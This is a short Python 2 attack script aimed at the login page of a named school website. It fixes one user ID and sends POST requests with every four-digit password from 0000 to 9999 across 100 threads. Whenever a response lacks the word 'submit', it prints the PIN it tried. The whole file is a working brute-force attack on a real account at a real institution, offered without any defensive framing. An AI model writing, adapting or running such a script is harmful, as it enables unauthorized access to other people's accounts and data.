#! python2
# coding=utf-8
# target=http://cwt.mkc.edu.tw/login.aspx?ReturnUrl=%2f
import requests
import threading

def brute(L, H):
  for i in range(L, H):
    r=requests.post('http://cwt.mkc.edu.tw/login.aspx?ReturnUrl=%2f', 
      data={
        'ScriptManager1':'UpdatePanel1|btnLogin',
        '__LASTFOCUS':'',
        '__EVENTTARGET':'',
        '__EVENTARGUMENT':'',
        '__VIEWSTATE':'/wEPDwULLTE3MzU0MzczMjQPZBYCAgMPZBYCAgUPZBYCZg9kFhQCAQ8PFgIeBFRleHQFHummrOWBlemGq+itt+euoeeQhuWwiOenkeWtuOagoWRkAgcPDxYCHwAFkgHmnKzmoKHluKvnlJ/oq4vkvb/nlKjlrbjomZ8o5ZOh5bel5Luj6JmfKeS9nOeCuuW4s+iZn++8jOi6q+WIhuitieW+jO+8lOeivOeCuuWvhueivOS+humAsuihjOatpOW5s+WPsOeahOeZu+WFpe+8jOW4s+iZn+WvhueivOiri+S9v+eUqOWwj+Wvq+i8uOWFpWRkAgsPFgIfAAV3PGEgY2xhc3M9InNpY25fMDQiIGhyZWY9Im1haWx0bzpzeXN0ZW1jY0BtYWlsLm1rYy5lZHUudHc/U3ViamVjdD3mhI/opovlm57ppYsiIHRpdGxlPSLmnI3li5nkv6HnrrEiIHRhcmdldD0iYmxhbmsiPjwvYT5kAg0PDxYCHwAFBTYsNDk0ZGQCDw8PFgIfAAUGMTcsNTM2ZGQCEQ8PFgIfAAUFICAyNjFkZAITDw8WAh8ABQcyLDc0Ni42ZGQCFQ8PFgIfAAUHNjAxLDk4MGRkAhcPDxYCHwAFBTQsODU5ZGQCGQ9kFgYCAQ8WAh4JaW5uZXJodG1sBQQyMDE5ZAIDDw8WAh8ABR7ppqzlgZXphqvorbfnrqHnkIblsIjnp5HlrbjmoKFkZAIFDxYCHwAFiwQ8YSBocmVmPSJtYWlsdG86c3lzdGVtY2NAbWFpbC5ta2MuZWR1LnR3P1N1YmplY3Q96aas5YGV6Yar6K23566h55CG5bCI56eR5a245qCh5Lit5paH6IO95Yqb6Zuy56uv6Ki65pa35bmz5Y+w5oSP6KaL5Zue6aWLJmJvZHk95ZCE5qCh5Lit5paH6IO95Yqb57e057+S5bmz5Y+w57ay5Z2A5LiN5ZCM77yM6KuL5Yu/5Lul57ay6Lev5pCc5bCL5pa55byP5L6G5p+l5om+57ay5Z2A77yM6KuL5Lul6ICB5bir5YWs5ZGK55qE57ay5Z2A54K65Li744CCJTBE6Iul6KaB6Kmi5ZWP5biz6Jmf55u46Zec5LqL5a6c77yM6KuL5aGr5a+r5Lul5LiL6LOH5paZJTBEJTBE5qCh5ZCN77ya6aas5YGV6Yar6K23566h55CG5bCI56eR5a245qChJTBE54+t57Sa77yaJTBE5aeT5ZCN77yaJTBE5a246Jmf77yaJTBEJTBE5Zub5qij5b+F5aGr6LOH6KiK77yM5Lul5L6/5a6i5pyN5Lit5b+D5YSY6YCf54K65oKo5p+l6Kmi44CCIiB0aXRsZT0i5pyN5YuZ5L+h566xIiB0YXJnZXQ9ImJsYW5rIj5zeXN0ZW1jY0BtYWlsLm1rYy5lZHUudHc8L2E+ZGSFGpQLRapZAEXk2yieKpaaeokBT7sabIYsxp7L+S2Ybw==',
        '__VIEWSTATEGENERATOR':'C2EE9ABB',
        '__EVENTVALIDATION':'/wEdAAUZ++uSKfoPp+PgbNekzlloMI14W7/wgUr52WRFnWK3l1ncozjiY2uerT4fyhfyLssz0pbtemMeEG4g1PnXXStTop4oRunf14dz2Zt2+QKDENSVOD7Ksi5sci7ir/wuVOIaAjUWOsjtpqo9S2G7eDis',
        'hid':'1366*768',
        'txtID':'50311235',
        'ttPwd':str(i).zfill(4),
        '__ASYNCPOST':True,
        'btnLogin':'確認送出'
      }
    )
    text=r.content.decode('utf-8')
    if 'submit' not in text:
      print(i)
      exit(0)

threads = 100
for i in range(threads):
  block = 100
  t = threading.Thread(target = brute, args = (block * i, block * (i+ 1)))
  t.start()